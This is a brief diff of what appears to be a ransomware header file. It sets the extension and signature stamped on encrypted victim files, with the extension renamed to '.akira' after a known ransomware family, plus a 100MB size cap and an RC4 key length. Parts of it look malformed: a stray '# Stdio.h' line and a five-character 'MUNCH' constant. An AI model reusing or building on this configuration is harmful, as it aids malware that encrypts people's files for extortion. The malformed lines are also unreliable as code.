@@ -5,8 +5,8 @@
 # Stdio.h
 
 
-#define ENCRYPTED_FILE_EXTENSION	L".rnsmd"
-#define ENC_FILE_SIGNATURE			'RNSM'
+#define ENCRYPTED_FILE_EXTENSION	L".akira"
+#define ENC_FILE_SIGNATURE			'MUNCH'
 
 #define MAX_FILE_SIZE_TO_ENC		0x6400000 // 104857600 - 100MB
 #define RC4_KEY_SIZE				32
